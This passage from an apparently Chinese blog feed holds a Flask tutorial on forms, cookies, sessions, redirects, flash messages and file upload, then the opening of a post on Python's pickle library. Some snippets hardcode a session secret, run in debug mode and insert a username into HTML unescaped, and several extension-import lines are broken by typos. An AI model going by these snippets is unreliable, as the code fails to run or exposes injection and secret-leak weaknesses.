将表单数据发送到模板"></a>Flask 将表单数据发送到模板</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/result'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>      result <span class="token operator">=</span> request<span class="token punctuation">.</span>form      <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"result.html"</span><span class="token punctuation">,</span>result <span class="token operator">=</span> result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>result.html:</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token name">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span> <span class="token attr-value"><span class="token punctuation attr-equals">=</span> 1</span><span class="token punctuation">></span></span>     &#123;% for key, value in result.items() %&#125;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span> &#123;&#123; key &#125;&#125; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span>       <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span> &#123;&#123; value &#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span> &#123;% endfor %&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask-Cookies"><a href="#Flask-Cookies" class="headerlink" title="Flask Cookies"></a>Flask Cookies</h2><p>Cookie以文本文件的形式存储在客户端的计算机上。其目的是记住和跟踪与客户使用相关的数据，以获得更好的访问者体验和网站统计信息。</p><p><strong>Request对象</strong>包含Cookie的属性。它是所有cookie变量及其对应值的字典对象，客户端已传输。除此之外，cookie还存储其网站的到期时间，路径和域名。</p><p>在Flask中，对cookie的处理步骤为：</p><h3 id="1-设置cookie："><a href="#1-设置cookie：" class="headerlink" title="1.设置cookie："></a>1.设置cookie：</h3><p>  设置cookie,默认有效期是临时cookie,浏览器关闭就失效</p><p>  可以通过 max_age 设置有效期， 单位是秒</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>   <span class="token comment"># 设置响应体</span>resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"A1andNS"</span><span class="token punctuation">,</span> <span class="token string">"A1andNS"</span><span class="token punctuation">,</span> max_age<span class="token operator">=</span><span class="token number">3600</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-获取cookie"><a href="#2-获取cookie" class="headerlink" title="2.获取cookie"></a>2.获取cookie</h3><p>  获取cookie，通过request.cookies的方式， 返回的是一个字典，可以获取字典里的相应的值</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">cookie_1 <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"A1andNS"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-删除cookie"><a href="#3-删除cookie" class="headerlink" title="3.删除cookie"></a>3.删除cookie</h3><p>  这里的删除只是让cookie过期，并不是直接删除cookie</p><p>  删除cookie，通过delete_cookie()的方式， 里面是cookie的名字</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"del success"</span><span class="token punctuation">)</span>  <span class="token comment"># 设置响应体</span>resp<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token string">"A1andNS"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>w3cschool实例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/set_cookies"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_cookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">"w3cshool"</span><span class="token punctuation">,</span> <span class="token string">"w3cshool"</span><span class="token punctuation">,</span>max_age<span class="token operator">=</span><span class="token number">3600</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/get_cookies"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_cookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    cookie_1 <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"w3cshool"</span><span class="token punctuation">)</span>  <span class="token comment"># 获取名字为Itcast_1对应cookie的值</span>    <span class="token keyword">return</span> cookie_1<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/delete_cookies"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_cookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span><span class="token string">"del success"</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>delete_cookie<span class="token punctuation">(</span><span class="token string">"w3cshool"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask会话"><a href="#Flask会话" class="headerlink" title="Flask会话"></a>Flask会话</h2><p>与Cookie不同，<strong>Session（会话）</strong>数据存储在服务器上。会话是客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储在服务器上的临时目录中。</p><p>为每个客户端的会话分配<strong>会话ID</strong>。会话数据存储在cookie的顶部，服务器以加密方式对其进行签名。对于此加密，Flask应用程序需要一个定义的<strong>SECRET_KEY</strong>。</p><p>Session对象也是一个字典对象，包含会话变量和关联值的键值对。</p><p>例如，要设置一个**’username’**会话变量，请使用以下语句：</p><pre class="line-numbers language-none"><code class="language-none">Session[‘username’] &#x3D; ’admin’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要释放会话变量，请使用**pop()**方法。</p><pre class="line-numbers language-none"><code class="language-none">session.pop(&#39;username&#39;, None)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>W3Cschool实例代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token keyword">from</span> flask <span class="token keyword">import</span> make_response<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> escape<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'fkdjsafjdkfdlkjfadskjfadskljdsfklj'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'username'</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> <span class="token string">'登录用户名是:'</span> <span class="token operator">+</span> username <span class="token operator">+</span> <span class="token string">'&lt;br>'</span> <span class="token operator">+</span> \                 <span class="token string">"&lt;b>&lt;a href = '/logout'>点击这里注销&lt;/a>&lt;/b>"</span>    <span class="token keyword">return</span> <span class="token string">"您暂未登录， &lt;br>&lt;a href = '/login'>&lt;/b>"</span> <span class="token operator">+</span> \         <span class="token string">"点击这里登录&lt;/b>&lt;/a>"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''   &lt;form action = "" method = "post">      &lt;p>&lt;input type ="text" name ="username"/>&lt;/p>      &lt;p>&lt;input type ="submit" value ="登录"/>&lt;/p>   &lt;/form>   '''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment"># remove the username from the session if it is there</span>   session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>   <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask重定向和错误"><a href="#Flask重定向和错误" class="headerlink" title="Flask重定向和错误"></a>Flask重定向和错误</h2><p>Flask类有一个**redirect()**函数。调用时，它返回一个响应对象，并将用户重定向到具有指定状态代码的另一个目标位置。</p><p>**redirect()**函数的原型如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Flask<span class="token punctuation">.</span>redirect<span class="token punctuation">(</span>location<span class="token punctuation">,</span> statuscode<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在上述函数中：</p><ul><li><p><strong>location</strong>参数是应该重定向响应的URL。</p></li><li><p><strong>statuscode</strong>发送到浏览器标头，默认为302。</p></li><li><p><strong>response</strong>参数用于实例化响应。</p><p>以下状态代码已标准化：</p><ul><li>HTTP_300_MULTIPLE_CHOICES</li><li>HTTP_301_MOVED_PERMANENTLY</li><li>HTTP_302_FOUND</li><li>HTTP_303_SEE_OTHER</li><li>HTTP_304_NOT_MODIFIED</li><li>HTTP_305_USE_PROXY</li><li>HTTP_306_RESERVED</li><li>HTTP_307_TEMPORARY_REDIRECT</li></ul><p><strong>默认状态</strong>代码为<strong>302</strong>，表示**’found’**。</p></li></ul><p>Flask类具有带有错误代码的**abort()**函数。</p><pre class="line-numbers language-none"><code class="language-none">Flask.abort(code)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>Code</strong>参数采用以下值之一：</p><ul><li><strong>400</strong> - 用于错误请求</li><li><strong>401</strong> - 用于未身份验证的</li><li><strong>403</strong> - Forbidden</li><li><strong>404</strong> - 未找到</li><li><strong>406</strong> - 表示不接受</li><li><strong>415</strong> - 用于不支持的媒体类型</li><li><strong>429</strong> - 请求过多</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>      <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token punctuation">:</span>         <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">else</span><span class="token punctuation">:</span>         abort<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span>   <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask消息闪现"><a href="#Flask消息闪现" class="headerlink" title="Flask消息闪现"></a>Flask消息闪现</h2><p>一个好的基于 GUI 的应用程序会向用户提供有关交互的反馈。例如，桌面应用程序使用对话框或消息框，JavaScript 使用警报用于类似目的。</p><p>在 Flask Web 应用程序中生成这样的信息性消息很容易。Flask 框架的闪现系统可以在一个视图中创建消息，并在名为 <strong>next</strong> 的视图函数中呈现它。</p><p>Flask 模块包含 <strong>flash()</strong> 方法。它将消息传递给下一个请求，该请求通常是一个模板。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flash<span class="token punctuation">(</span>message<span class="token punctuation">,</span> category<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中，</p><ul><li><strong>message</strong> 参数是要闪现的实际消息。</li><li><strong>category</strong> 参数是可选的。它可以是“error”，“info”或“warning”。</li></ul><p>模板调用 **get_flashed_messages()**。</p><pre class="line-numbers language-none"><code class="language-none">get_flashed_messages(with_categories, category_filter)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>两个参数都是可选的。如果接收到的消息具有类别，则第一个参数是元组。第二个参数仅用于显示特定消息。</p><h2 id="Flask-文件上传"><a href="#Flask-文件上传" class="headerlink" title="Flask 文件上传"></a>Flask 文件上传</h2><p>在 Flask 中处理文件上传非常简单。它需要一个 HTML 表单，其 <code>enctype</code> 属性设置为“<code>multipart / form-data”</code>，将文件发布到 URL。URL 处理程序从 <code>request.files[]</code> 对象中提取文件，并将其保存到所需的位置。</p><p>每个上传的文件首先会保存在服务器上的临时位置，然后将其实际保存到它的最终位置。目标文件的名称可以是硬编码的，也可以从 <code>request.files[file] </code>对象的<code>filename</code>属性中获取。但是，建议使用 <code>secure_filename()</code> 函数获取它的安全版本。</p><p>可以在 Flask 对象的配置设置中定义默认上传文件夹的路径和上传文件的最大大小。</p><pre class="line-numbers language-none"><code class="language-none">app.config[‘UPLOAD_FOLDER’] 定义上传文件夹的路径 app.config[‘MAX_CONTENT_LENGTH’] 指定要上传的文件的最大大小（以字节为单位）<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如</p><p>编写upload.html:</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>File Upload<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:5000/uploader<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">accept</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>.jpg,.png<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合一下python后端来接收和保存文件</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/uploader'</span><span class="token punctuation">,</span> methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">uploader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>      f <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>      f<span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>secure_filename<span class="token punctuation">(</span>f<span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token string">'file uploaded successfully'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Flask扩展"><a href="#Flask扩展" class="headerlink" title="Flask扩展"></a>Flask扩展</h2><p>Flask通常被称为微框架，因为核心功能包括基于<strong>Werkzeug</strong>的WSGI和路由以及基于<strong>Jinja2</strong>的模板引擎。此外，Flask框架还支持cookie和会话，以及<strong>JSON</strong>，静态文件等Web帮助程序。显然，这不足以开发完整的Web应用程序。而Flask扩展就具备这样的功能<strong>。</strong>Flask扩展为Flask框架提供了可扩展性。</p><p>有大量的Flask扩展可用。Flask扩展是一个Python模块，它向Flask应用程序添加了特定类型的支持。Flask Extension Registry（Flask扩展注册表）是一个可用的扩展目录。可以通过<strong>pip</strong>实用程序下载所需的扩展名。</p><p>重要的Flask扩展：</p><ul><li><strong>Flask Mail</strong> - 为Flask应用程序提供SMTP接口</li><li><strong>Flask WTF</strong> - 添加WTForms的渲染和验证</li><li><strong>Flask SQLAlchemy</strong> - 为Flask应用程序添加SQLAlchemy支持</li><li><strong>Flask Sijax</strong> - Sijax的接口 - Python/jQuery库，使AJAX易于在Web应用程序中使用</li></ul><p>每种类型的扩展通常提供有关其用法的大量文档。由于扩展是一个Python模块，因此需要导入它才能使用它。Flask扩展名通常命名为flask-foo。导入的操作如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask_foo <span class="token keyword">import</span> <span class="token punctuation">[</span><span class="token keyword">class</span><span class="token punctuation">,</span> function<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flask 0.7后还可以使用：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask<span class="token punctuation">.</span>ext <span class="token keyword">import</span> foo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于这中用法，需要激活兼容性模块，可以用过运行flaskext_compat.py来安装：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flaskext compatflaskext_compat<span class="token punctuation">.</span>activete<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> flask<span class="token punctuation">.</span>etx <span class="token keyword">import</span> foo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="学习参考资料"><a href="#学习参考资料" class="headerlink" title="学习参考资料"></a>学习参考资料</h2><p>[1] <a href="https://www.w3cschool.cn/flask/">https://www.w3cschool.cn/flask/</a> W3Cschool教程</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Flask小应用&quot;&gt;&lt;a href=&quot;#Flask小应用&quot; class=&quot;headerlink&quot; title=&quot;Flask小应用&quot;&gt;&lt;/a&gt;Flask小应用&lt;/h2&gt;&lt;p&gt;最简单的Flask小程序就是hello world了，下面用flask写一个hello wo</summary>
      
    
    
    
    <category term="Python学习" scheme="http://yoursite.com/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Flask" scheme="http://yoursite.com/tags/Flask/"/>
    
  </entry>
  
  <entry>
    <title>Python之pickle库学习</title>
    <link href="http://yoursite.com/post/Python%E4%B9%8Bpickle%E5%BA%93%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://yoursite.com/post/Python%E4%B9%8Bpickle%E5%BA%93%E5%AD%A6%E4%B9%A0.html</id>
    <published>2021-02-03T01:23:23.000Z</published>
    <updated>2021-06-28T14:41:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>以下内容主要是基于Python3的，Python2环境下序列化的用法和以下类似，但是序列化生成的结果与Python3环境下是不同的。Python</p><p>2的pickle内容从实例三开始。</p><h2 id="什么是pickle库"><a href="#什么是pickle库" class="headerlink" title="什么是pickle库"></a>什么是pickle库</h2><ol><li><p>Python标准库，只支持python的基本数据类型。</p></li><li><p>可以处理复杂的序列化语法，序列化时，只是序列化整个序列对象，而非内存地址。</p></li></ol><p>pickle模块实现了基本的数据序列化和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。所以pickle库也有两类主要接口，一个是序列化接口，一个是反序列化接口。</p><h2 id="如何使用pickle库"><a href="#如何使用pickle库" class="headerlink" title="如何使用pickle库"></a>如何使用pickle库</h2><p>要想调用pickle库，很简单。因为这是一个Python的内置库，不需要另行安装，可以直接引用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而pickle的常用函数有如下几个：</p><h3 id="pickle-dump"><a href="#pickle-dump" class="headerlink" title="pickle.dump()"></a>pickle.dump()</h3><p><code>pickle.dump(object, file, protocol=None)</code></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>dump操作方法可以将序列以二进制的形式存放在文件中，以便下次使用。</p></blockquote><ul><li>必填参数 obj 表示将要封装的对象</li><li>必填参数 file 表示 object 要写入的文件对象，file 必须以二进制模式打开，即 wb。file文件指的是<code>.pkl</code>后缀的pkl文件。</li><li>可选参数 protocol 表示告知 pickle 使用的协议，支持的协议一共有5中不同的类型，即（0,1,2,3,4）。（0,1,2）对应的是python早期的版本，（3,4）则是在python3之后的版本。默认的协议是添加在 Python 3 中的协议 3。</li></ul><h3 id="pickle-load"><a href="#pickle-load" class="headerlink" title="pickle.load()"></a>pickle.load()</h3><p><code>pickle.load(file)</code></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 